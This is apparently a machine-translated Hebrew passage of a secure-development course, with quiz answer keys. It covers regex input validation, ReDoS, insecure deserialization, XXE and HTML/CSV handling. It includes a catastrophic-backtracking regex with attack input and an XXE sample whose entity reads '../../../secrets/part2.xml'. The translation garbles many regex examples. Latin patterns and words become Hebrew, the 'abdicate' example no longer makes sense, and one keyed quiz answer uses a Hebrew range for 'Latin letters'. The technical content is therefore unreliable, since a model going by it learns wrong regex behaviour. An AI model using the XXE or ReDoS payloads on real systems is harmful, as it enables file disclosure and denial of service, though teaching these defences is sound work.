למעשה, כברירת מחדל, regexes *מחפשים* את התבנית הנתונה במחרוזת. כלומר, בדרך כלל יישום regex יראה אם תבנית תואמת טקסט כלשהו אם היא מתחילה בתו הראשון, ואז בתו השני, וכן הלאה, ותדווח אם היא יכולה למצוא  התאמה *כלשהי*. אז התבנית "ca" **תתאים גם ל-[ברט]**"abdicate**" כי יש "**חתול" **במילה "**abdicate**".**

עם זאת, ביטויים רגולריים יכולים לעשות הרבה יותר. אם אתה עוקב אחר תבנית עם "**&#42;** ", כלומר "*0 פעמים או יותר*". אז תבנית regex** "a&#42;b&#42;**x" מתארת תבנית של 0  או יותר **a's, ואחריה 0 **או יותר b**'s, ואחריה **x****. תבנית זו תואמת מחרוזות כמו "**aabx", "**bbbx**" ו-"**abx**", אך לא "**aabb****". רוב יישומי regex תומכים גם ב- "**+**" עבור "*1 פעמים או יותר*" ו- "**?** " עבור "*0 או 1 פעמים*". רוב יישומי regex מאפשרים לך גם להשתמש בסוגריים כדי לקבץ ביטויים, לדוגמה, "f(abc**)&#42;**d" תואם אם יש "**f**", ואחריו 0 או יותר מופעים של הרצף "**abc**", ואחריו האות "**d**".

בדרך כלל ניתן לבצע התאמה חסרת רגישות לרישיות באמצעות אפשרות כלשהי. הקפד להגדיר את האזור אם אתה משתמש בהתאמה חסרת רגישות לרישיות, מכיוון שלשפות שונות יש כללים שונים, ולפעמים הכללים יכולים להיות מורכבים. לדוגמה, בגרמנית, האות "sharp-s" באותיות קטנות "**ß**" שקולה לאותיות רישיות "**SS**" בעת שימוש בהתאמה חסרת רגישות לרישיות. במקרים מסוימים, ייתכן שתרצה לבצע רק "*התאמה חסרת רגישות לרישיות ASCII*"; פעולה זו משווה רצף של נקודות קוד כאילו כל נקודות קוד ASCII בטווח 0x41 ל- 0x5A (A עד Z) מופו לנקודות הקוד המתאימות בטווח 0x61 ל- 0x7A (a עד z).

יש הרבה יותר רגקסים. למעשה, יש ספר שלם על ביטויים רגולריים בלבד, [*מאסטרינג ביטויים רגולריים, מהדורה שלישית,*](https://www.oreilly.com/library/view/mastering-regular-expressions/0596528124/) מאת ג'פרי פרידל (2006), ויש הרבה מדריכים על רגקסים כגון המדריך ביטויים רגולריים [לפולק רגיל](https://refrf.shreyasminocha.me/) מאת שריאס מינוצ'ה. אבל הקדמה זו תביא אותנו להתחיל, כי אנחנו עכשיו הולכים לדון איך regexes יכול לשמש לאימות קלט.

### שימוש בביטויים רגולריים לאימות קלט טקסט

תוכניות רבות צריכות לאמת במהירות טקסט קלט ממקורות לא מהימנים. אמנם ישנן דרכים רבות לעשות זאת, regexes הם לעתים קרובות כלי שימושי במיוחד לאימות קלט של טקסט. Regexes הם בדרך כלל מהירים לרישום (כך שהם לוקחים מעט מאוד זמן פיתוח), קלים לשימוש וזמינים באופן נרחב. הם גם גמישים מספיק עבור משימות אימות קלט רבות, קומפקטיים, ובדרך כלל מתבצעים במהירות רבה. הם גם ידועים ומובנים באופן נרחב. אלה יתרונות חשובים; אם כתיבת אימות קלט קשה מדי, זה לא ייעשה. הם לא פותרים את כל בעיות אימות הקלט האפשריות, אבל הם שימושיים מספיק כדי שיהיה חשוב לדעת אותם.

ביטויים רגולריים שימשו במקור בתוכנה *לחיפוש* תבניות טקסט, ולא לאימות קלטי טקסט כנגד תבנית. Regexes טובים גם באימות קלט טקסט, אך יש כמה דברים שעליך לדעת כדי שתוכל להשתמש ב- regexes כראוי לאימות קלט טקסט.

#### התאם, אל תחפש

בעיה מרכזית עם regexes היא כי כברירת מחדל רוב יישומי regex *לחפש* כדי לראות אם תבנית נתונה ניתן למצוא בכל מקום בתוך טקסט כלשהו. כשאנחנו עושים אימות קלט אנחנו לא רוצים לחפש; אנו רוצים לדעת אם כל קלט הטקסט *תואם בדיוק* לתבנית. זה אומר שאנחנו צריכים להיות מסוגלים לשאול את יישום regex  "*האם טקסט קלט זה תואם בדיוק את התבנית הזו"* - ולדחות את הקלט אם הוא לא תואם. כמו בכל אימות קלט אחר, עלינו להפוך את התבנית שלנו למגבילה ככל האפשר, ואם הקלט אינו תואם, אז לדחות את הקלט.

הדרך הרגילה לדרוש regex כדי להתאים קלט שלם היא לכלול *עוגנים* regex. פשוט התחל את תבנית regex שלך  עם *עוגן התחלה* -  המיוצג בדרך כלל על ידי "**^**" או לפעמים "\A**" - וסיים את התבנית עם** "$" **או לפעמים "****\z**". עם אלה, הקלט כולו חייב להתאים לתבנית. לדוגמה,  regex זה יתאים *לכל* טקסט המכיל "**מונית", "**מכונית**", או** "חתול**" - זה אפילו יתאים** "abdicate**" - אז אתה לא צריך *** להשתמש regex כזה לאימות קלט:*

**כא.[ברט]**

לעומת זאת, regex זה יתאים *רק* למילים "**מונית", "**מכונית**", או** "חתול**" ברוב יישומי regex, מכיוון ש**-"^" פירושו "התאם את ההתחלה" ** ו-**"$*" פירושו "התאם את הסוף*****"*:* 

**^כא[ברט]$**

ביישומים מסוימים (בהתאם לאפשרות), "**^" **עשוי להיות * "התחלה של כל שורה" * ולא * "תחילת המחרוזת"  - ואתה בדרך כלל רוצה *"תחילת המחרוזת".** דבר דומה יכול לקרות עם "**$**". מכאן והלאה נניח כי "**^**" ו- "**$**" פירושם התחלה וסוף של המחרוזת כולה.

#### דע את יישום Regex שלך

כמעט לכל שפת תכנות יש לפחות יישום regex טוב אחד. כולם חולקים תכונות רבות, אך רבים מהם שונים במקצת. לכן, כאשר אתה משתמש ביישום regex שלא השתמשת בו בעבר, עיין בתיעוד שלו בכל פעם שאתה משתמש בפעולה שלא השתמשת בה בעבר. הנה כמה וריאציות שכדאי לחפש.

ישנן שלוש משפחות עיקריות של סימונים בשפת regex:

1. ביטוי רגולרי בסיסי (BRE)<br>זוהי ברירת המחדל עבור **grep** ו **- sed**. זה מוגדר על ידי תקן POSIX. עם זאת, התחביר שלו לפעמים קצת מביך, ולכן ברוב המקרים, קל יותר להשתמש בביטויים רגולריים מורחבים במקום זאת לאימות קלט.

2. ביטוי רגולרי מורחב (ERE)ביטוי<br> זה מוגדר על-ידי תקן POSIX ומוסיף יכולות כגון שימוש בסוגריים לקיבוץ ו- "**+" **עבור "*אחד או יותר".* זה משמש לעתים קרובות בתוכניות C. כך למשל, "**[ב-ד]+" **פירושו "*אחת או יותר מהאותיות B, C או D".*

3. ביטויים רגולריים תואמי Perl (PCRE)<br>זוהי בעיקר הרחבה של תבנית ERE; שפות תכנות רבות אחרות משתמשות במשפחה זו של שפות regex. הוא כולל יכולות כמו "**\d**" לייצוג ספרות.

 הנה כמה דברים חשובים שמשתנים:

* לפעמים יש אפשרות או שיטה חלופית כדי להתאים את הקלט כולו; אם אפשרות זו זמינה, באפשרותך להשתמש בה במקום בסימני העיגון. עם זאת, ודא שהוא תואם את כל העניין; שיטות מסוימות בודקות רק את ההתחלה.

* לפעמים "**^**" תואם את ההתחלה של הנתונים המלאים, בעוד שבאחרים הוא מייצג את ההתחלה של כל שורה בנתונים. כנ"ל לגבי "**$**". זה נשלט לעתים קרובות על ידי  אפשרות *מרובת שורות*.

* ה"**.** " עבור ייצוג * "כל תו"* לא תמיד תואם את תו השורה החדשה (**\n**); לעתים קרובות יש אפשרות להפעיל או לכבות זאת.

* האם הוא תומך כראוי ב- Unicode ובקידוד שבו אתה משתמש?

* האם הוא יכול לטפל בנתונים עם ** תו NUL** (ערך בית 0) בתוך הנתונים? אם לא, ונתוני הקלט שלך עשויים לכלול  תו NUL מוטבע ** , יהיה עליך לאמת תחילה את הנתונים כדי לוודא שאין ** תווי NUL** לפני העברת הנתונים ליישום regex.**

* האם התאמה היא תלוית רישיות? בדרך כלל זה תלוי רישיות כברירת מחדל, ויש דרך טריוויאלית להפוך אותו לחסר רגישות למקרה. אם הוא אינו רגיש לרישיות, זכור כי בדיוק אילו תווים יש התאמות רגישות לרישיות תלוי באזור. לדוגמה, "**I**" ו- "**i**" תואמים באנגלית ("**en**") ובאזור C ("**C**"), אך לא בטורקית ("**tr**"). באזור הטורקי, אות ההון הלטינית Unicode I תואמת את האות הלטינית הקטנה DOTLESS I - לא אותיות קטנות "**i**".

בשפות מסוימות, כגון ב- Ruby, אתה משתמש בדרך כלל  ב- \**A ו- **\z** במקום  ב**- "^" ו- "$" כדי להתאים התחלה/סיום של מחרוזת, מכיוון ש**- "^**" ** ו**- "**$**" תואמים קו התחלה/סיום במקום זאת.****

#### עדיפות סניף

כמעט כל יישומי regex תומכים *בענפים* - כלומר,** "aa|bb|**cc" תואם **aa**, **bb** או **cc**. כל יישומי ERE ו- PCRE תומכים בענפים, ואפילו חלק מיישומי BRE תומכים בענפים אם הם כתובים כ- "**&#92;**|" במקום "**| **". העדיפות ** של פעולת הסניף היא סטנדרטית, אבל זה לא מה שחלק מהמשתמשים מצפים. regex "**^aa|bb$" **פירושו " * או שזה מתחיל עם aa או שזה נגמר עם bb", *לא *"בדיוק aa או bb".*  כאשר אתה משתמש ב- regexes לאימות קלט, רצף של ענפים שאינו מוקף בסוגריים הוא כמעט תמיד טעות. מה שאתה בדרך כלל רוצה זה "**^(aa|bb)$**" שפירושו "*בדיוק aa או bb".*

** לכן, בכל פעם שיש לך ענף ("|") ב- regex, קבץ את הביטוי כולו עם ענפים באמצעות סוגריים.**

#### בדיקת מאמתי קלט

שוב, עליך לדעת מה התוכנה שלך לא צריכה לקבל, ולהשתמש בחלק מהדוגמאות הללו כמקרי בדיקה אוטומטיים כדי להבטיח שהתוכנה שלך תדחה אותן כראוי. זה חשוב במיוחד עם regexes, כי קל לכתוב regex שנראה בסדר אבל מאפשר קלט זה לא היה מיועד. זה יכול לעזור לך לתפוס, למשל, עוגנים חסרים או כשלים להקיף ענפים בסוגריים.

#### חידון 1.4: שימוש בביטויים רגולריים לאימות קלט טקסט

\>\>איזה מהבאים מתאים רק ל"אות לטינית אחת או יותר" באמצעות ביטוי רגולרי מורחב (בהינתן אזור POSIX)?<<

(!)  **[א-ת]&#42;**

( ) **[א-ת]+**

( ) **^[א-ת]&#42;$**

(x) **^[א-ת]+$**

[הסבר]

זכור, **^...$** נדרשים כדי להפוך את זה לרשימת היתרים (הטקסט *חייב* להתאים לתבנית), ו- "**+" **פירושו "*אחד או יותר".*

[הסבר]

### התמודדות עם התקפות ReDoS על ביטויים רגולריים

בעת הוספת קוד, קיים סיכון שלקוד שנוסף יש פגיעות. הדבר נכון במיוחד כאשר אתה מוסיף קוד שאמור לסייע בשמירה על אבטחת התוכנה שלך, מכיוון שבהגדרה, בעיות בקוד זה עלולות להוביל לבעיית אבטחה.

אם תוסיף בדיקות אימות קלט באמצעות ביטויים רגולריים - גישה נפוצה ומועילה - יש סוג של פגיעות שבאפשרותך להוסיף שלא במתכוון הנקראת פגיעות *מניעת שירות של ביטוי רגיל (ReDoS).* אם התוכנה שלך כוללת פגיעות של ReDoS, תוקפים יכולים לכפות מצבים שבהם ניתן להפעיל את הביטוי הרגולרי במשך זמן רב במיוחד (ייתכן ימים או שנים). התוצאה היא מניעת שירות (DoS) - ייתכן שההתקפה תוכל לשלוח כמות קטנה של נתונים ולגרום לשירות להיות לא זמין! זה לא תיאורטי. בשנת  2020, חבילת **הרחבות websocket npm** וגרסת רובי שלה נמצאו שניהם יש פגם זה (אלה קיבלו מזהים  CVE-2020-7662 [ ו ](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7662)CVE-2020-7663[ בהתאמה).](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7663)

הסיבה שפגיעות ReDoS אפשרית היא שלרוב יישומי regex יש מורכבות במקרה הגרוע ביותר שגדלה באופן אקספוננציאלי בהתבסס על גודל הקלט. קצת רקע עשוי לעזור כאן. ישנן שתי גישות עיקריות ליישום regexes:  אוטומט סופי דטרמיניסטי (*DFA) או *אוטומט סופי לא דטרמיניסטי** (NFA). DFAs הם מהירים, בין השאר משום שהם לעולם אינם חוזרים לאחור, ו- DFAs חסינים מפני פגיעויות ReDoS. אבל DFAs מוגבלים גם במה שהם יכולים לעשות. בפועל, רוב יישומי regex כיום הם NFAs, ו- NFAs *פגיעים* פוטנציאלית להתקפות ReDoS.

יישומי NFA של regexes - וזה רובם - *backtrack* בכל פעם שהם נכשלים התאמה מסוימת עד שהם מוצאים התאמה או ניסו את כל האפשרויות. בקיצור, במקרה הגרוע ביותר הם מנסים את *כל* השילובים. עבור דפוסי ביטוי רגולריים רבים המקרה הגרוע ביותר אינו מהווה בעיה. עם זאת, סוגים מסוימים של דפוסי regex יכולים להפוך את המקרה הגרוע ביותר הזה ממש רע. בפרט, בואו נדמיין שאנחנו מספקים דפוס שבו:

1. תבנית regex משתמשת בחזרה על תת-ביטויים מורכבים (השימוש ב- "**+**" ו- "**&#42;** " על תת-ביטויים מורכבים), ו-

2. בתוך תת-הבעות חוזרות אלה, ישנם סימני חזרה וביטויים נוספים התואמים סיומת של התאמה אחרת. ([OWASP ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service&#95;-&#95;ReDoS))

דוגמה טריוויאלית היא תבנית regex "**^(a+)+$**". בואו נדמיין שתוקף סיפק את ערך הקלט "**aaaaX**". NFA יתאים את האות הראשונה "a" עם "**a**" בתבנית בקלות, אבל אז יישום regex יש שתי אפשרויות: האם זה צריך לנסות להחיל את  "+" *הפנימי* או החיצוני ** "+** ** **" **על האות הבאה? רוב המימושים ינסו תחילה את הפנימי, ולאחר מכן יעקבו לאחור לפי הצורך. במקרה הגרוע ביותר, NFA צריך לנסות את *כל* השילובים האפשריים. לכן, כדי לקבוע אם הקלט "**aaaaX**" תואם את התבנית, regex NFA צריך לנסות 16 נתיבים אפשריים (כל האפשרויות), כאשר כל אחד מהם נכשל בסופו של דבר בגלל "X" נגרר.**** אם התוקף מספק את הקלט "**aaaaaaaaaaaaaaX**" יהיו 65536 נתיבים אפשריים, כאשר מספר הנתיבים יוכפל עבור כל "**a**" נוסף. אם תוקף סיפק 80 '**a**' ואחריו **X**, שרשור זה ינסה לעבד את כל הצירופים, מה שייקח כל כך הרבה זמן שהוא יהפוך למניעת שירות.

אנו משתמשים במונח *regexes פגיעים* עבור דפוסי regex עם התנהגות זו במקרה הגרוע ביותר. מונח נפוץ בתעשייה לדפוסים אלה הוא *רגקסים מרושעים*. זה לא שהרגקס מסופק על ידי תוקף בהכרח, זה פשוט שההתנהגות הגרועה ביותר שלהם היא "רעה" וזה הופך אותם לפגיעים להתקפה. מונח נוסף להתנהגות זו הוא *מעקב לאחור קטסטרופלי.*

ישנם פתרונות רבים לבעיה זו, כולל הדברים הבאים:

1. השתמש ביישום regex המשתמש ב- DFA. יישומים מבוססי DFA אינם פגיעים לבעיה זו. לדוגמה, במערכת האקולוגית של NPM, "**re2**" מיישם מנוע regex של DFA. עם זאת, מנועי regex מבוססי DFA הם בדרך כלל פחות מסוגלים ובסביבות רבות הם הרבה יותר קשה להתקין ולהשתמש, ולכן זה נעשה לעתים רחוקות.

2. שנה את regex כך שלא תהיה לו התנהגות זו במקרה הגרוע ביותר. זו הגישה הרגילה. היזהרו במיוחד מכל קבוצה "**(...)** " המכיל ענף ו/או מסתיים בחזרה והוא עצמו חוזר על עצמו.

    1. אם יש חזרה או הסתעפות ב- regex שהיא עצמה חוזרת על עצמה, כתוב מחדש את ה- regex כך שהתו הבא בקלט יקבע באופן חד משמעי אם החזרה ממשיכה או לא. לדוגמה, לשכתב את "**^(a+)+**$" כ- "**^a+$**".

    2. גישה אחרת היא להשתמש במנגנונים שאומרים למנוע regex לא לחזור אחורה; ליישומי regex רבים יש *קוונטיפיירים רכושניים* ו/או *קיבוץ אטומי* שיכולים למנוע מעקב אחורי מיותר.

    3. הימנעו מחזרה בלתי מוגבלת. לדוגמה, הגדר ספירות חזרות מרביות (לדוגמה, **{0,5}**) כך שההתנהגות במקרה הגרוע ביותר תהיה מוגבלת מאוד.

    כלים מסוימים בוחנים קוד מקור כדי לזהות regexes עם התנהגויות במקרה הגרוע ביותר (אלה עשויים להיות כלים עצמאיים או חלק מכלים גדולים יותר).

3. היכן שניתן, הגבל תחילה את האורך המרבי של מחרוזות קלט ובדוק תחילה את אורך הקלט. אם התשומות חייבות להיות קצרות, הגידול האקספוננציאלי בזמן עדיין יסתיים ככמות זמן כוללת קטנה.

4. יישם פסק זמן, ב- regex (אם נתמך) או ביישום בכללותו. לדוגמה, [Ruby 3.2](https://www.ruby-lang.org/en/news/2022/04/03/ruby-3-2-0-preview1-released/) תומך בערך פסק זמן גלובלי של regex (`Regexp.timeout`) ובפרמטר פסק זמן בעת יצירת מיידי של אובייקט ביטוי רגולרי. [מנגנוני MatchTimeout של .NET framework](https://docs.microsoft.com/en-us/dotnet/api/system.text.regularexpressions.regex.matchtimeout) יכולים גם להגדיר ערך פסק זמן כללי או ערך זמן קצוב עבור כל regex.

5. אל תפעיל regexes המסופקים על ידי תוקפים במערכות שאינן שלהם. זה בסדר עבור היריב לספק regex כי הם עצמם תמיד לרוץ (במקרה זה, התוקפים פשוט לתקוף את עצמם). אך אם תוקפים יכולים לספק regexes שאתה מפעיל, ייתכן שהם יוכלו לגרום ל- ReDOS (אלא אם כן נקטת בצעדים אחרים כדי למנוע זאת). Regexes הן, באופן כללי, שפות תכנות, ובדרך כלל עליך להימנע מהפעלת תוכניות המסופקות על-ידי התוקף. אפשר לעשות את זה בצורה מאובטחת יחסית, אבל אתה צריך לנקוט הרבה אמצעי זהירות וזה תמיד בטוח יותר פשוט לא לעשות את זה.

אם אתה מעוניין בפרטים נוספים, עיין [בדיון OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service&#95;-&#95;ReDoS) על כך.

הערה: ReDoS הוא לעתים קרובות *לא* נקודת תורפה אמיתית. regexes כאלה יכולים ** להיות פגיעות רק אם הם פועלים על מערכת מהימנה ומעבדים קלט לא מהימן. ישנם כלים רבים שיכולים לזהות regexes הפגיעים ל- ReDoS אך אינם קובעים אם מקורות הקלט אינם מהימנים. כלים כאלה יכולים להציף מפתחים במה שמכונה "פגיעויות" שאינן באמת פגיעויות. בנוסף, במקרים מסוימים אמצעי נגד (כמו גדלי קלט מרביים ופסקי זמן) מבטלים ביעילות את יעילות ReDoS. גם כאשר regex מעבד תשומות לא מהימנות ואמצעי נגד אלה נכשלים, ReDoS לכל היותר ** יגרום למניעת שירות, לא לאובדן סודיות או יושרה. לכן, בעוד ש-ReDoS יכול להוות נקודת תורפה אמיתית, לעתים קרובות הוא אינו מהווה נקודת תורפה או שהוא פחות חשוב. אם אתה מוצא את עצמך מתמודד עם מספר רב של דוחות פגיעות של ReDoS, בדוק שוב אם אלה פגיעויות אמיתיות.
(ראה  [של Enosuchblog "פגיעויות" ReDoS ותמריצים לא מיושרים"](https://blog.yossarian.net/2022/12/28/ReDoS-vulnerabilities-and-misaligned-incentives).)

#### חידון 1.5: התמודדות עם התקפות ReDoS על ביטויים רגולריים

\>\>אילו מבין אלה הן * דרכים מעשיות* למתן התקפות ReDoS? בחר את כל התשובות הרלוונטיות.<<

[!x] השתמש במנגנון ביטוי רגולרי שאינו משתמש במעקב לאחור (כלומר, DFA).

[x] במידת האפשר, כתוב regexes שאין להם את ההתנהגות במקרה הגרוע ביותר. לדוגמה, היזהרו מחזרות בתוך חזרות.

[x] הגבל את הגודל המרבי של הקלט, כך שגם ההתנהגות במקרה הגרוע ביותר לא תהיה כל כך גרועה.

[ ] אף אחד מהנ"ל

## אימות קלט: מעבר למספרים וטקסט

### דה-סריאליזציה לא בטוחה

אל תסתפקו בקבלת תבניות נתונים מורכבות יותר. במקום זאת, ודא שקבלת קלט זה ממקור לא מהימן לא תגרום לבעיית אבטחה.

בעיה מסוכנת היא דזריזציה לא בטוחה.  **דה-סריאליזציה** היא תהליך של  המרת רצף כלשהו (של בתים או תווים) לתבנית פנימית כלשהי; תהליך זה עשוי ליצור מספר אובייקטים. Deserialization יכול לקרות בעת קריאת נתונים מרשת או מאחסון, כי בשני המקרים יש צורך להפוך רצף של בתים או תווים לפורמט פנימי. למרבה הצער, deserialization יכול לגרום לבעיות חמורות, כי אם המקור אינו מהימן, אז התוקף עשוי לספק רצף מניפולציה:

1. ייתכן שהנתונים יומרו לערך בלתי צפוי שאין לסמוך עליו. לדוגמה, ייתכן שזהו ערך מובנה של קובץ Cookie שבמקור אמר  admin=**n**, אך התוקף עשוי לשנות את הערך ל**- admin=y**. אם התוכנית קיבלה נתונים אלה באופן עיוור, התוקף עלול להפוך לפתע למנהל מערכת!

2. ביטול סידור הנתונים עלול לגרום לביצוע קוד, לדוגמה, הוא עלול ליצור מחלקות או מופעים ו/או לקרוא לשיטות שנבחרו על-ידי התוקף עם ארגומנטים שסופקו על-ידי התוקף. זוהי בעיה במיוחד עבור פורמטים המיועדים להתמדה שרירותית של אובייקטים. דוגמה לכך היא פורמט מלפפון חמוץ, אשר מבצע באופן אוטומטי קוד במקרים מסוימים בעת deserializing נתונים.

** הפתרון הבטוח ביותר הוא לא לקבל אובייקטים סדרתיים ממקורות לא מהימנים.**

אם עליך לקבל אובייקטים סדרתיים ממקורות לא מהימנים, באפשרותך להשתמש בתבניות סידרה שאינן תומכות בביצוע קוד. לדוגמה, השתמש בתבניות סידרה המאפשרות רק סוגי נתונים פרימיטיביים. זה נוגד את הבעיה השנייה - ביצוע קוד - אבל כשלעצמו, זה לא פותר את הבעיה הראשונה - ערכים בלתי צפויים. לכן, אם לאחר בחירת גישה למניעת ביצוע קוד, אמת את הקלט שקיבלת באמצעות הגישות שכבר דנו בהן.

במקרים מסוימים, באפשרותך למנוע התקפות deserialization באמצעות בדיקות אימות. בעיקרון, הפוך נתונים לא מהימנים לנתונים מהימנים! לשם כך, לפני שתבטל את הנתונים, הפעל בדיקת אימות כדי לוודא שהנתונים מגיעים ממקור מהימן. דרך נפוצה לעשות זאת היא על-ידי בדיקת חתימה דיגיטלית, קוד אימות הודעה (MAC), הצפנה מאומתת או אמצעי דומה. גישה זו נפוצה במיוחד ביישומי אינטרנט; לעתים קרובות, שרת אינטרנט ישלח נתונים ללקוח, כך שהלקוח יוכל לשלוח אותם מאוחר יותר בחזרה (לדוגמה, כקובץ Cookie). גישה זו היא בסדר כל עוד שרת האינטרנט מוודא את שלמותו (כדי למנוע יצירת תוקף או חבלה) *לפני* שהוא מתרוקן.

יש אנשים שממליצים לאכוף אילוצי סוג מחרוזת (למשל, לאפשר רק למחלקות מסוימות להיות מסולקות). למרבה הצער, מעקפים רבים לטכניקה זו נמצאו לאורך השנים. זה רעיון טוב כטכניקת *התקשות* (או פשוט כדרך לזהות באגים מוקדם). עם זאת, במערכות רבות, זה כנראה מסוכן מדי להמליץ כהגנה נאותה בפני עצמה.

 deserialization לא מאובטח היא טעות נפוצה כל כך ביישומי אינטרנט כי זה 2017 OWASP Top 10 #8, 2021 CWE Top 25 #13, ו 2019 CWE Top 25 #23. זה [CWE-502](https://cwe.mitre.org/data/definitions/502.html), *דה-סריאליזציה של נתונים לא מהימנים*. זה נחשב גם לחלק 2021 OWASP Top 10 #8 (A08:2021), *כשלי תוכנה ותקינות נתונים*. התוקפים עשויים למצוא פגיעויות כאלה קשות יותר לניצול, אך ברגע שהפגיעות מתגלה היא עלולה לגרום לפגיעה מיידית במערכת שלמה, מכיוון שהיא עלולה לספק שליטה מלאה במערכת לתוקף.

#### חידון 1.6: דה-סריאליזציה לא בטוחה

\>\>אחד הסיכונים הגדולים בהסרת נתונים הוא שבהתאם לתבנית הסידור, הנתונים עלולים לגרום להפעלת קוד המוגדר על-ידי התוקף. אמת או שקר?<<

(x) נכון

( ) לא נכון

### מבני נתוני קלט (XML, HTML, CSV, JSON והעלאות קבצים)

כמובן, לפעמים תוכנית צריכה לקבל מבני נתונים מורכבים נפוצים, כגון XML, HTML, JSON ו- CSV. מאז אלה הם פורמטים נפוצים, כדאי לדבר עליהם במיוחד.

בעוד שמבחינה טכנית מדובר במיתרים, במציאות מדובר במיתרים בעלי מבנה פנימי מורכב יותר משלהם. לעתים קרובות עדיף להשתמש בספריות שתוכננו במיוחד לטיפול בתבניות קלט אלה, כל עוד הן מיועדות לטפל בקלטים שעלולים להיות זדוניים. בדרך כלל עליך לנסות לזהות ולדחות מבני נתונים שאינם תקפים מבחינה תחבירית, ולאחר מכן, במידת הצורך, לבדוק שהם עומדים בכל סכימה ספציפית שהם אמורים לעמוד בה. באופן אידיאלי, ספריות אלה יאפשרו לך לציין רק מה ברצונך לקבל, ולדחות את כל השאר. אם מנגנונים אלה אינם יכולים לאמת את הקלט באופן מלא, השלם זאת עם כל אימות קלט שאתה צריך כדי להבטיח שרק נתונים חוקיים יתקבלו.

#### .XML

נתונים והודעות רבים מקודדים ב- XML (שפת סימון מורחבת). XML הוא חלק מתבניות אחרות, כגון SOAP (פרוטוקול גישה לאובייקט פשוט). ישנם שני מונחים אודות XML המבולבלים באופן נרחב:

* ****<br>XML בנוי היטב היטב עוקב אחר כללי תחביר מסוימים. לדוגמה, כל התגים שנפתחו חייבים להיות סגורים, ורכיבי XML חייבים להיות מקוננים כראוי. אם אתה מקבל XML, *לפחות* ודא שה- XML בנוי היטב; יש ספריות זמינות בקלות עבור זה, ויישומים אמורים לקבל רק XML כי הוא בנוי היטב.

* ****<br>XML חוקי עונה על הגדרת סכימה כלשהי. הסכימה מציינת מידע כגון *אילו* תגים מותרים, כיצד הם עשויים להיות מקוננים ואם חלקם נדרשים. הגדרת סכימה, אם היא קפדנית, היא סוג של רשימת התרה. לכן, בדיקת תקפות לפני קבלת קלט XML יכולה להיות שימושית מאוד להתמודדות עם התקפות. עם זאת, *אל* תאפשר לתוקף לקבוע באיזו סכימה להשתמש - להחליט איזו סכימה בסדר ולהשתמש *בה*. לפעמים אין סכימה זמינה, ואם אתה מחלץ רק חלק קטן של XML, ייתכן שלא כדאי ליצור סכימת XML.

אם אתה משתמש ב- XML, קיימת פגיעות נפוצה ביותר שעליך להתמודד איתה הנקראת ישויות חיצוניות של XML (XXE). כדי להבין אותם, אתה צריך להבין כמה פונקציונליות XML שאינה ידועה באופן נרחב.

XML תומך בהפניות חיצוניות שניתן לטעון באופן אוטומטי בעת טעינת המסמך המקורי. ההפניה החיצונית יכולה להיות כל מיקום קובץ או כתובת URL. משמעות הדבר היא שתוקף יכול לספק קבצים שגורמים בשקט לטעינה ולמיקום של קבצים או כתובות URL אחרים במקומות מסוימים. פונקציונליות זו קיימת מסיבה כלשהי, ומערכות מסוימות תלויות בה באופן לגיטימי. עם זאת, מפתחים רבים אין מושג כי זה אפשרי, וזה הוביל פגיעויות רבות. להלן דוגמה למסמך XML עם ישויות חיצוניות מוטבעות:

~~~~xml
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
     "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">

    <!DOCTYPE letter [

      <!ENTITY part1 SYSTEM "http://www.example.com/part1.xml">

      <!ENTITY part2 SYSTEM "../../../secrets/part2.xml"> ]> ...

    <building>

    &part1; &part2;

    </building>
~~~~

באופן כללי, אין לקבל הפניות חיצוניות לא מסומנות ממקורות לא מהימנים. הנה כמה פתרונות אפשריים:

* קבע את תצורת קורא/מעבד XML כך שיתעלם או ידחה הפניות חיצוניות. הקפידו לבדוק, בבדיקות האוטומטיות שלכם, שעדיין מתעלמים ממנו! מכיוון שרוב היישומים אינם משתמשים בישויות חיצוניות, זהו בדרך כלל הפתרון הקל ביותר.

* לאסור או לבדוק (עם רשימת התרה) כל הפניה חיצונית לפני השימוש.

* אל תשתמש ב- XML, כולל פורמטים כגון SOAP המשתמשים ב- XML. לפורמטים אחרים, כמו JSON, אין את המנגנון הזה ולכן לא יכולה להיות בעיה זו.

לקבלת מידע נוסף אודות בעיה זו, עיין בסעיף [דף האינטרנט 'ישויות חיצוניות של OWASP XML'] (https://owasp.org/www-פרוייקט-top-ten/2017/A4_2017-XML_External_Entities_(XXE).html).

 XML XXE היא טעות כה נפוצה ביישומי אינטרנט שהיא 2017 OWASP Top 10 #4, 2021 CWE Top 25 #23, ו- 2019 CWE Top 25 #17. הוא מזוהה גם כ- [CWE-611](https://cwe.mitre.org/data/definitions/611.html), *הגבלה לא נאותה של הפניה לישות חיצונית של XML*.

#### .HTML

בדרך כלל אתה יכול פשוט להתקשר לספרייה כדי לאמת HTML ולהעביר קבוצה של תגים מותרים (למשל,. ** <p> **) ותכונות (למשל, **href=**). כל מה שאסור להסיר או לדחות. זה יבטל תגיות מסוכנות כמו **<script>**  ממקורות חיצוניים (בהנחה שאינך כולל תגים מסוכנים בקבוצת התגים המותרים).

למרות שזה נושא פוטנציאלי גדול, בפועל, המפתח הוא לעתים קרובות להשתמש בספריה עם ברירות מחדל מאובטחות הגון. אם אתה מאפשר רק תגים כגון **<p> ** **, <i> **ו**-<b>,** ולהגביל תכונות לערכים כגון **מזהה**, כמות הנזק שניתן לעשות מוגבלת מאוד.,

#### .CSV

התבנית "ערך מופרד פסיקים" (CSV) היא בתיאוריה פשוטה. כל שורה היא רשומה, שבה השדות מופרדים בפסיקים. השורה הראשונה היא בדרך כלל "שורת כותרת" - שמות השדות מופרדים על ידי פסיקים (אתה תמיד צריך לספק את הכותרת, שכן זה עושה את קובץ ה- CSV יותר להרחבה הרבה יותר קל לטפל עם כלים אחרים).

